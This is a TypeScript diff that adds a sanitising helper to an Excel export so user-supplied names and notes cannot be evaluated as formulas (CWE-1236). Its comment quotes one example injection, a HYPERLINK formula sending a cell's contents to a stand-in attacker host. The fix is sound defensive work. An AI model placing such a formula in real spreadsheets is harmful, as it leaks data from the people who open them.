@@ -29,6 +29,24 @@ function argbFill(argb: string): any {
   return { type: 'pattern', pattern: 'solid', fgColor: { argb } };
 }
 
+/**
+ * Neutralize Excel/CSV formula-injection (CWE-1236).
+ *
+ * If a string cell value starts with `=`, `+`, `-`, `@`, TAB, or CR, Excel
+ * will evaluate it as a formula on open. A user naming a theme
+ * `=HYPERLINK("https://attacker/?d="&A1,"Click")` produces a workbook that
+ * can exfiltrate data when opened by a colleague. Per Microsoft's documented
+ * mitigation, prefixing such strings with a single quote `'` opts the cell
+ * out of formula evaluation; the prefix character is not rendered in Excel.
+ *
+ * Non-string values pass through unchanged so numeric points and percentages
+ * remain numeric (formula-injection only applies to text-typed cells).
+ */
+function safeCell(v: unknown): unknown {
+  if (typeof v !== 'string') return v;
+  return /^[=+\-@\t\r]/.test(v) ? `'${v}` : v;
+}
+
 // eslint-disable-next-line @typescript-eslint/no-explicit-any
 export async function buildExcelWorkbook(product: Product, ExcelJS: any): Promise<any> {
   const workbook = new ExcelJS.Workbook();
@@ -48,7 +66,7 @@ export async function buildExcelWorkbook(product: Product, ExcelJS: any): Promis
   ];
 
   // Row 1: project name title
-  const ws1Title = ws1.addRow([product.name]);
+  const ws1Title = ws1.addRow([safeCell(product.name)]);
   ws1Title.font = { bold: true, size: 16 };
   // Row 2: blank spacer
   ws1.addRow([]);
@@ -78,7 +96,7 @@ export async function buildExcelWorkbook(product: Product, ExcelJS: any): Promis
       ws1.mergeCells(rowNum, 1, rowNum, 9);
       // eslint-disable-next-line @typescript-eslint/no-explicit-any
       const cell: any = ws1.getCell(rowNum, 1);
-      cell.value = theme.name;
+      cell.value = safeCell(theme.name);
       cell.font = { bold: true };
       cell.fill = argbFill(THEME_FILL_COLORS[theme.color ?? ''] ?? DEFAULT_FILL_COLOR);
     }
@@ -104,15 +122,15 @@ export async function buildExcelWorkbook(product: Product, ExcelJS: any): Promis
     }
 
     const dataRow = ws1.addRow([
-      theme.name,
-      backbone.name,
-      rib.name,
+      safeCell(theme.name),
+      safeCell(backbone.name),
+      safeCell(rib.name),
       rib.category,
       rib.size ?? '',
       points,
       pct / 100,
-      releaseStr,
-      rib.notes ?? '',
+      safeCell(releaseStr),
+      safeCell(rib.notes ?? ''),
     ]);
 
     // Notes cell: wrap text, anchor to top (column 9)
@@ -143,7 +161,7 @@ export async function buildExcelWorkbook(product: Product, ExcelJS: any): Promis
   ];
 
   // Row 1: project name title
-  const ws2Title = ws2.addRow([product.name]);
+  const ws2Title = ws2.addRow([safeCell(product.name)]);
   ws2Title.font = { bold: true, size: 16 };
   // Row 2: blank spacer
   ws2.addRow([]);
@@ -163,7 +181,7 @@ export async function buildExcelWorkbook(product: Product, ExcelJS: any): Promis
     const pctComplete = getReleasePercentComplete(product, release.id);
     const { core, nonCore } = getCoreNonCorePointsForRelease(product, release.id);
     const relRow = ws2.addRow([
-      release.name,
+      safeCell(release.name),
       totalPoints,
       pctComplete / 100,
       core,
